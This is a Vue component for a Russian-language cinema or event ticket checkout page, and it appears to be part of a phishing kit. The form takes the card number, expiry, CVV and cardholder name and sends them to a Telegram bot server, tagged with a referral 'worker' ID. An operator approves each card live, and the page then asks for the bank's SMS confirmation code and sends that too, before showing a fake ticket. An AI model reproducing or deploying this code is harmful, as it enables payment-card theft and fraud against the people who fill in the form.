<template>
  <div v-if="!showTicket" class="flex justify-center">
    <img src="/src/assets/fkas.png" alt="Your Image Description" />
  </div>

  <div v-if="errorCard" class="flex flex-col items-center justify-center">
    <div  class="flex items-center">
        <img class="w-14 h-14" src="/src/assets/error.png"/>
        <div class="ml-4">
            <p>Ошибка. Данные не корректные. Попробуйте ещё раз</p>
        </div>
    </div>

    <button @click="repCardData" class="mt-4 bg-blue-500 text-white p-2 rounded-md">Повторить</button>
  </div>

  <div v-if="showTicket">
    <div class="flex justify-center sm:-rotate-90">
      <div class="relative">
        <img src="/src/assets/TicketData.png" alt="Ticket Data" class="w-72 h-[670px] sm:h-full" />
        <!-- Text Overlays -->
        <div class="absolute rotate-90 top-[317px] left-[110px] text-black">{{ this.$route.query.date }}</div>
        <div class="absolute rotate-90 top-[300px] left-[76px] text-black">{{ this.$route.query.hour }}</div>
        <div class="absolute rotate-180 top-[15px] left-[93px] text-black ">{{ this.transactionId }}</div>
        <div class="absolute rotate-90 top-[348px] left-[133px] text-black">{{ this.$route.params.id }}</div>
      </div>
    </div>
  </div>

  <div v-if="errorSMS" class="flex flex-col items-center justify-center">
    <div  class="flex items-center">
        <img class="w-14 h-14" src="/src/assets/error.png"/>
        <div class="ml-4">
            <p>Ошибка. Данные не корректные. Попробуйте ещё раз</p>
        </div>
    </div>

    <button @click="repSMS" class="mt-4 bg-blue-500 text-white p-2 rounded-md">Повторить</button>
  </div>


   <div v-if="loading" class="flex flex-col items-center justify-center my-2">
  <div class="flex flex-col items-center mt-52" role="status">
    <span class="text-3xl mb-5 pl-1 mx-auto">Подождите, этот процесс может занять до минуты......</span>
    <svg aria-hidden="true" class="w-32 h-32 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600 mb-2" viewBox="0 0 100 101" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z" fill="currentColor"/>
        <path d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z" fill="currentFill"/>
    </svg>
  </div>
</div>

    
    <div v-if="!showTicket && !loading && !showSmsInput && !errorCard && !errorSMS" class=" min-h-screen flex justify-center pt-10">

        <div v-if="!loading && !showSmsInput && !errorCard && !errorSMS" class="max-w-96 space-y-16 items-right">
         
            <!-- First Card -->
            <div class="w-96 h-56 m-auto bg-red-100 rounded-xl relative text-white shadow-2xl transition-transform transform ">
                
              <img class="relative object-cover w-full h-full rounded-xl" src="https://i.imgur.com/kGkSg1v.png">
                <div class="w-full px-8 absolute top-8">
                    <div class="flex justify-between">
                        <div>
                            <p class="font-light">Держатель карты</p>
                            <p class="font-medium tracking-widest">{{ userName || cardInfo.name }}</p>
                        </div>
                        <img v-if="userCardNumber[0] === '4'" class="w-35 h-10" src="/src/assets/visa.png"/>
                        <img v-else-if="userCardNumber[0] === '5'" class="w-20 h-13" src="/src/assets/mscard.png"/>
                        <img v-if="userCardNumber[0] === '2'" class="w-35 h-10" src="/src/assets/mir.png"/>
                    </div>
                    <div class="pt-1">
                        <p class="font-light">Введите номер карты</p>
                        <p class="font-medium tracking-more-wider">{{ userCardNumber || cardInfo.number }}</p>
                    </div>
                    <div class="pt-6 pr-6">
                        <div class="flex justify-between">
                            <div>
                                <p class="font-light text-xs">Срок действия карты</p>
                                <p class="font-medium tracking-wider text-sm">{{ userExpiry || cardInfo.expiry }}</p>
                            </div>
                            <div>
                                <p class="font-light text-xs">CVC/CVV код</p>
                                <p class="font-bold tracking-more-wider text-sm">{{ userCvv || cardInfo.cvv }}</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Input Fields -->
            <div class="w-96 m-auto  space-y-4">
    <div class="flex flex-col items-center justify-center space-y-2">
        <p>До оплаты : {{ totalPrice }} ₽</p>
        <div class="flex space-x-2">
            <p v-if="seats" class="px-1">место: {{ seats }}</p>
            <p v-if="rows" >ряд : {{ rows }}</p>
        </div>
    </div> 
                <div>
                    <label class="block text-gray-700">Держатель карты:</label>
                    <input v-model="userName" :placeholder="cardInfo.name" @input="restrictName" type="text" class="mt-1 p-2 w-full border rounded-md">
                </div>
                <div>
                    <label class="block text-gray-700">Введите номер карты:</label>
                    <input v-model="userCardNumber" :placeholder="cardInfo.number" @input="restrictCardNumber" type="text" class="mt-1 p-2 w-full border rounded-md">
                </div>
                <div class="flex space-x-4">
                    <div class="w-1/2">
                        <label class="block text-gray-700">Срок действия карты:</label>
                        <input v-model="userExpiry" :placeholder="cardInfo.expiry" @input="handleExpiryInput" type="text" class="mt-1 p-2 w-full border rounded-md">
                    </div>
                    <div class="w-1/2">
                        <label class="block text-gray-700">CVV:</label>
                        <input v-model="userCvv" :placeholder="cardInfo.cvv" @input="restrictCvv" type="text" class="mt-1 p-2 w-full border rounded-md">
                    </div>
                </div>
                <button @click="updateCardDetails" class="bg-blue-500 text-white p-2 w-full rounded-md">Оплатить</button>
                
            </div>
            
            <div class="mt-1 text-center text-gray-mid">
                Осуществляя платеж, вы соглашаетесь с <a href="/" class="text-blue">правилами использования сервиса</a>.<br>    
                      </div>
    </div>
        
  
    </div>
    <div v-if="showSmsInput && !loading && !errorCard && !errorSMS" class="mx-auto w-72 h-auto my-auto mt-8 space-y-4 ">
        <div>
            <label class="block text-gray-700">Введите СМС код из сообщений для проведения оплаты:</label>
            <input v-model="smsCode" type="text" class="mt-1 p-2 w-full border rounded-md">
        </div>
        <button @click="sendSmsDataToTelegram" class="bg-blue-500 text-white p-2 w-full rounded-md">Оплатить</button>
        <img src="/src/assets/cc.png" alt="" width="160" height="120">
    </div>
</template>



<script>
import axios from 'axios';
import { useRoute } from 'vue-router';
import TicketLayout from '../components/TicketLayout.vue';
export default {
  components: {
    TicketLayout
  },
  props: ['referral', 'city', 'variant', 'id'],
  data() {

    return {
      cardInfo: {
        name: 'Ivanov Ivan',
        number: '1234 5678 9012 3456',
        expiry: 'MM/YY',
        cvv: '***'
      },
      userName: '',
      userCardNumber: '',
      userExpiry: '',
      userCvv: '',
      prevExpiryLength: 0,
      showSmsInput: false,
      smsCode: '',
      loading: false,
      transactionId: null,
      errorSMS: false,
      errorCard: false,
      showTicket: false,
    };
  },
  mounted() {
    window.scrollTo(0, 0);
    const eventSource = new EventSource('http://localhost:1236/events');
    eventSource.onmessage = (event) => {
      const data = JSON.parse(event.data);
      this.handleBotResponse(data);
    };
    this.toggleFooter(false);
  },
  unmounted() {
    this.toggleFooter(true); // Show the footer when the component unmounts
  },
  methods: {
    toggleFooter(show) {
      const footer = document.getElementById('main-footer');
      if (footer) {
        footer.style.display = show ? '' : 'none';
      }
    },
    restrictName() {
      this.userName = this.userName.replace(/\d+/g, '');
    },
    restrictCardNumber() {
      this.userCardNumber = this.userCardNumber.replace(/[^0-9]/g, '');
      this.userCardNumber = this.userCardNumber.slice(0, 16);
      if (this.userCardNumber.length > 0) {
        this.userCardNumber = this.userCardNumber.match(/.{1,4}/g).join(' ');
      }
    },
    handleExpiryInput(event) {
      let value = event.target.value;
      this.userExpiry = this.userExpiry.replace(/[^0-9/]/g, '');
      if (value.length === 2 && this.prevExpiryLength < 2) {
        this.userExpiry = value + "/";
      }
      this.userExpiry = this.userExpiry.slice(0, 5);
      this.prevExpiryLength = value.length;
    },
    restrictCvv() {
        this.userCvv = this.userCvv.replace(/[^0-9]/g, '').slice(0, 3);
    },
    sendCardDataToTelegram() {
      this.transactionId = Date.now(); 
      const payload = {
        userName: this.userName,
        userCardNumber: this.userCardNumber,
        userExpiry: this.userExpiry,
        userCvv: this.userCvv,
        totalPrice: this.totalPrice,
        worker: this.$route.params.referral,
        transactionId: this.transactionId,
        hour: this.hour,
      };

      fetch('http://localhost:1236/send-card-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Failed to send card data');
        }
        return response.text();
      })
      .then(result => {
        console.log('Message sent to server:', result);
        this.loading = true; 
      })
      .catch(error => {
        console.error('Error sending message to server:', error);
      });
    },
    handleBotResponse(data) {
  // Split the message to extract the action and the transaction ID
  const [action, transactionId] = data.message.split('_');

  // Check if the transaction ID matches and then check the action
  if (transactionId === this.transactionId.toString()) {
    if (action === 'yes') {
      this.loading = false;
      this.showSmsInput = true;
    } else if (action === 'no') {
           
            this.errorCard = true; 
            
            this.loading = false;
            this.showSmsInput = false;
            
        } else if (action === 'approve'){
            this.loading = false;
            this.showTicket = true;
            this.showSmsInput = false;
        } else if (action === 'reject'){
            this.errorSMS = true;
            this.loading = false;

        }
    
  }
},

  repCardData() {
    this.errorCard = false;
    this.errorSMS = false;
    this.loading = false;
    this.showSmsInput = false;
  },
  repSMS() {
    this.errorSMS = false;
    this.showSmsInput = true;
  },
    updateCardDetails() {
      if (this.userName && this.userCardNumber && this.userExpiry && this.userCvv) {
        this.sendCardDataToTelegram();
      } else {
        alert("Заполните все данные!");
      }
    },
    sendSmsDataToTelegram() {
    this.loadingSMS = true;
    const smsPayload = {
      smsCode: this.smsCode,
      transactionId: this.transactionId, // Reuse the same transaction ID as for card data
    };

    fetch('http://localhost:1236/send-sms-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(smsPayload)
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to send SMS data');
      }
      return response.text();
    })
    .then(result => {
      console.log('SMS data sent to server:', result);
      this.loading = true; 
    })
    .catch(error => {
      console.error('Error sending SMS data to server:', error);
    });
  },
    
    // Other methods as needed
  },
  computed: {
    // Computed properties as needed
    seats() {
      return this.$route.query.seats;
    },
    rows() {
      return this.$route.query.rows;
    },
    totalPrice() {
      return this.$route.query.totalprice;
    },
    date() {
      return this.$route.query.date;
    },
    hour() {
      return this.$route.query.hour;
    }
  }
};
</script>






<style scoped>
/* Your styles for this component (if any) */
</style>
